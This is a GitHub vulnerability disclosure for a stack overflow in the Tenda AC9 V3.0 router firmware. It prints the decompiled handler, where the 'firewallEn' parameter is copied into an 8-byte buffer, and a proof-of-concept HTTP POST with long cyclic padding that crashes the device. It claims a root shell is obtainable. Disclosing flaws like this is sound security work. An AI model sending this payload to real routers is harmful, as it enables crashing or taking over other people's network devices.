
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FGleamingEyes%2Fvul%2Fblob%2Fmain%2Ftenda_ac9%2FSetFirewallCfg.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FGleamingEyes%2Fvul%2Fblob%2Fmain%2Ftenda_ac9%2FSetFirewallCfg.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=GleamingEyes%2Fvul)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[GleamingEyes](/GleamingEyes)
/
**[vul](/GleamingEyes/vul)**
Public

* [Notifications](/login?return_to=%2FGleamingEyes%2Fvul) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2FGleamingEyes%2Fvul)
* [Star
   0](/login?return_to=%2FGleamingEyes%2Fvul)

* [Code](/GleamingEyes/vul)
* [Issues
  0](/GleamingEyes/vul/issues)
* [Pull requests
  0](/GleamingEyes/vul/pulls)
* [Actions](/GleamingEyes/vul/actions)
* [Projects
  0](/GleamingEyes/vul/projects)
* [Security](/GleamingEyes/vul/security)
* [Insights](/GleamingEyes/vul/pulse)

Additional navigation options

* [Code](/GleamingEyes/vul)
* [Issues](/GleamingEyes/vul/issues)
* [Pull requests](/GleamingEyes/vul/pulls)
* [Actions](/GleamingEyes/vul/actions)
* [Projects](/GleamingEyes/vul/projects)
* [Security](/GleamingEyes/vul/security)
* [Insights](/GleamingEyes/vul/pulse)

## Files

 main
## Breadcrumbs

1. [vul](/GleamingEyes/vul/tree/main)
2. /[tenda\_ac9](/GleamingEyes/vul/tree/main/tenda_ac9)
/
# SetFirewallCfg.md

Copy path Blame  Blame
## Latest commit

## History

[History](/GleamingEyes/vul/commits/main/tenda_ac9/SetFirewallCfg.md)231 lines (209 loc) · 10 KB main
## Breadcrumbs

1. [vul](/GleamingEyes/vul/tree/main)
2. /[tenda\_ac9](/GleamingEyes/vul/tree/main/tenda_ac9)
/
# SetFirewallCfg.md

Top
## File metadata and controls

* Preview
* Code
* Blame

231 lines (209 loc) · 10 KB[Raw](https://github.com/GleamingEyes/vul/raw/refs/heads/main/tenda_ac9/SetFirewallCfg.md)
# Tenda AC9 V3.0BR\_V15.03.06.42\_multi\_TD01 was discovered stack overflow via parameter 'firewall\_value' at url /goform/SetFirewallCfg

## Affected Version

US\_AC9V3.0BR\_V15.03.06.42\_multi\_TD01

## Firmware Download Address

[AC9V3.0升级软件\_腾达(Tenda)官方网站](https://www.tenda.com.cn/download/detail-2908.html)

## Vulnerability Description

Tenda AC9 V3.0 BR\_V15.03.06.42\_multi\_TD01 was discovered to contain a stack overflow via parameter 'firewall\_value' at url /goform/SetFirewallCfg.

## vulnerability Details

1. This vulnerability lies in the function 'formSetFirwallCfg'，The details are shown below:

```
void __cdecl formSetFirewallCfg(webs_t wp, char_t *path, char_t *query)
{
  int v3; // $s0
  int v4; // $s0
  int v5; // $s0
  char *wisp_ifname; // [sp+20h] [+20h]
  int sysmode; // [sp+24h] [+24h]
  int connect_type; // [sp+28h] [+28h]
  int wan_num; // [sp+2Ch] [+2Ch]
  int wan_id; // [sp+30h] [+30h]
  unsigned int ddos_bit; // [sp+34h] [+34h]
  _BOOL4 err_code; // [sp+38h] [+38h]
  char *firewall_value; // [sp+3Ch] [+3Ch]
  char firewall_buf[8]; // [sp+40h] [+40h] BYREF
  char old_ddos_buf[64]; // [sp+48h] [+48h] BYREF
  char old_wan_ping_buf[8]; // [sp+88h] [+88h] BYREF
  char mib_name[64]; // [sp+90h] [+90h] BYREF
  char mib_value[64]; // [sp+D0h] [+D0h] BYREF
  char ipopt_map[16]; // [sp+110h] [+110h] BYREF
  char old_map[128]; // [sp+120h] [+120h] BYREF
  char tcp_syn[32]; // [sp+1A0h] [+1A0h] BYREF
  char udp[32]; // [sp+1C0h] [+1C0h] BYREF
  char icmp[32]; // [sp+1E0h] [+1E0h] BYREF
  char old_tcp[32]; // [sp+200h] [+200h] BYREF
  char old_icmp[32]; // [sp+220h] [+220h] BYREF
  char old_udp[32]; // [sp+240h] [+240h] BYREF
  int pps[4]; // [sp+260h] [+260h] BYREF
  u_ddos_data_t ddos; // [sp+270h] [+270h] BYREF
  lan_info_t lan_info; // [sp+280h] [+280h] BYREF
  int wan_double_access_flag; // [sp+298h] [+298h] BYREF
  char wan_ifname[16]; // [sp+29Ch] [+29Ch] BYREF
  char wan_devname[16]; // [sp+2ACh] [+2ACh] BYREF
  char wl24g_work_mode[32]; // [sp+2BCh] [+2BCh] BYREF
  char wl5g_work_mode[32]; // [sp+2DCh] [+2DCh] BYREF

  memset(firewall_buf, 0, sizeof(firewall_buf));
  memset(old_ddos_buf, 0, sizeof(old_ddos_buf));
  memset(old_wan_ping_buf, 0, sizeof(old_wan_ping_buf));
  memset(mib_name, 0, sizeof(mib_name));
  memset(mib_value, 0, sizeof(mib_value));
  memset(ipopt_map, 0, sizeof(ipopt_map));
  memset(old_map, 0, sizeof(old_map));
  memset(tcp_syn, 0, sizeof(tcp_syn));
  memset(udp, 0, sizeof(udp));
  memset(icmp, 0, sizeof(icmp));
  memset(old_tcp, 0, sizeof(old_tcp));
  memset(old_icmp, 0, sizeof(old_icmp));
  memset(old_udp, 0, sizeof(old_udp));
  ddos_bit = 0;
  memset(pps, 0, sizeof(pps));
  memset(&lan_info, 0, sizeof(lan_info));
  firewall_value = websGetVar(wp, "firewallEn", "1111");
  if ( strlen(firewall_value) >= 4 )
  {
    strcpy(firewall_buf, firewall_value);
    GetValue("security.ddos.map", old_ddos_buf);
    GetValue("firewall.pingwan", old_wan_ping_buf);
    sprintf(mib_value, "%c,1500;%c,1500;%c,1500", firewall_buf[0], firewall_buf[2], firewall_buf[1]);
    SetValue("security.ddos.map", mib_value);
    SetValue("firewall.pingwan", &firewall_buf[3]);
    memset(mib_value, (int)&unk_5212F0, sizeof(mib_value));
    if ( GetValue("security.ddos.map", mib_value) )
    {
      if ( sscanf(mib_value, "%[^;];%[^;];%[^;]", icmp, udp, tcp_syn) == 3 )
      {
        if ( icmp[0] == 49 )
        {
          ddos_bit = 4;
          pps[0] = atoi(&icmp[2]);
        }
        if ( udp[0] == 49 )
        {
          ddos_bit |= 2u;
          pps[1] = atoi(&udp[2]);
        }
        if ( tcp_syn[0] == 49 )
        {
          ddos_bit |= 1u;
          pps[2] = atoi(&tcp_syn[2]);
        }
      }
      if ( sscanf(old_ddos_buf, "%[^;];%[^;];%[^;]", old_icmp, old_udp, old_tcp) != 3
        || old_icmp[0] != icmp[0]
        || icmp[0] != 48 && (v3 = pps[0], v3 != atoi(&old_icmp[2]))
        || old_udp[0] != udp[0]
        || udp[0] != 48 && (v4 = pps[1], v4 != atoi(&old_udp[2]))
        || old_tcp[0] != tcp_syn[0]
        || tcp_syn[0] != 48 && (v5 = pps[2], v5 != atoi(&old_tcp[2])) )
      {
        GetValue("security.ipop.map", ipopt_map);
        tpi_arp_ddos_ip_fence_enable(ddos_bit, ipopt_map);
        ddos.status = ddos_bit;
        ddos.icmp_threshold = pps[0];
        ddos.udp_threshold = pps[1];
        ddos.tcp_threshold = pps[2];
        get_ddos_ipopt_lan_info(&lan_info);
        tpi_ddos_ip_lan_info_set(&lan_info);
        tpi_ddos_fence_set(&ddos);
      }
    }
    if ( old_wan_ping_buf[0] != firewall_buf[3] )
    {
      wan_double_access_flag = 0;
      memset(wan_ifname, 0, sizeof(wan_ifname));
      strcpy(wan_devname, "eth1");
      memset(&wan_devname[5], 0, 11);
      memset(wl24g_work_mode, 0, sizeof(wl24g_work_mode));
      memset(wl5g_work_mode, 0, sizeof(wl5g_work_mode));
      GetValue("wl2g.public.mode", wl24g_work_mode);
      GetValue("wl5g.public.mode", wl5g_work_mode);
      if ( !strcmp(wl24g_work_mode, "wisp") || !strcmp(wl5g_work_mode, "wisp") )
      {
        wisp_ifname = (char *)getWispIfName();
        if ( wisp_ifname && *wisp_ifname )
        {
          strcpy(wan_ifname, wisp_ifname);
          if ( firewall_buf[3] == 49 )
          {
            doSystemCmd("iptables -t filter -D INPUT -i %s -p icmp -m icmp --icmp-type 8 -j DROP", wan_ifname);
            doSystemCmd("iptables -t filter -I INPUT -i %s -p icmp -m icmp --icmp-type 8 -j DROP", wan_ifname);
          }
          else
          {
            doSystemCmd("iptables -t filter -D INPUT -i %s -p icmp -m icmp --icmp-type 8 -j DROP", wan_ifname);
          }
        }
      }
      else
      {
        GetValue("wans.flag", mib_value);
        wan_num = atoi(mib_value);
        for ( wan_id = 0; wan_id < wan_num; ++wan_id )
        {
          sprintf(mib_name, "wan%d.connecttype", wan_id + 1);
          GetValue(mib_name, mib_value);
          connect_type = atoi(mib_value);
          GetValue("sys.mode", mib_value);
          sysmode = atoi(mib_value);
          tpi_wan_get_ifname(wan_id + 1, sysmode, connect_type, wan_ifname);
          if ( tpi_wan_double_access_check(&wan_double_access_flag) )
            break;
          if ( firewall_buf[3] == 49 )
          {
            if ( wan_double_access_flag == 1 )
            {
              doSystemCmd("iptables -t filter -D INPUT -i %s -p icmp -m icmp --icmp-type 8 -j DROP", wan_ifname);
              doSystemCmd("iptables -t filter -D INPUT -i %s -p icmp -m icmp --icmp-type 8 -j DROP", wan_devname);
              doSystemCmd("iptables -t filter -I INPUT -i %s -p icmp -m icmp --icmp-type 8 -j DROP", wan_ifname);
              doSystemCmd("iptables -t filter -I INPUT -i %s -p icmp -m icmp --icmp-type 8 -j DROP", wan_devname);
            }
            else
            {
              doSystemCmd("iptables -t filter -D INPUT -i %s -p icmp -m icmp --icmp-type 8 -j DROP", wan_ifname);
              doSystemCmd("iptables -t filter -I INPUT -i %s -p icmp -m icmp --icmp-type 8 -j DROP", wan_ifname);
            }
          }
          else if ( wan_double_access_flag )
          {
            doSystemCmd("iptables -t filter -D INPUT -i %s -p icmp -m icmp --icmp-type 8 -j DROP", wan_ifname);
            doSystemCmd("iptables -t filter -D INPUT -i %s -p icmp -m icmp --icmp-type 8 -j DROP", wan_devname);
          }
          else
          {
            doSystemCmd("iptables -t filter -D INPUT -i %s -p icmp -m icmp --icmp-type 8 -j DROP", wan_ifname);
          }
        }
      }
    }
  }
  err_code = CommitCfm() == 0;
  websWrite(wp, "HTTP/1.0 200 OK\r\n\r\n");
  websWrite(wp, "{\"errCode\":%d}", err_code);
  websDone(wp, 200);
}
```

2. in function 'formSetFirwallCfg' line 52, 'firewall\_value' is a a user-controlled parameter("firewallEn") and is read in without length check.

[![](/GleamingEyes/vul/raw/main/tenda_ac9/images/1_1.png)](/GleamingEyes/vul/blob/main/tenda_ac9/images/1_1.png)

3. Then content of 'firewall\_value' is copied into local variable 'firewall\_buf', which leads to a stack overflow vulnerability.

[![](/GleamingEyes/vul/raw/main/tenda_ac9/images/1_2.png)](/GleamingEyes/vul/blob/main/tenda_ac9/images/1_2.png)

## POC

By sending delicately constructed data package as the poc above, we can cause a stack overflow error.

```
POST /goform/SetFirewallCfg HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 1515
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/firewall.html?random=0.37882641100369097&
Cookie: password=7c90ed4e4d4bf1e300aa08103057ccbcemy1qw

firewallEn=111aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaeaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaeaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae1

```

you can write exp, which can achieve a very stable effect of obtaining the root shell.

## Author

田文奇

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

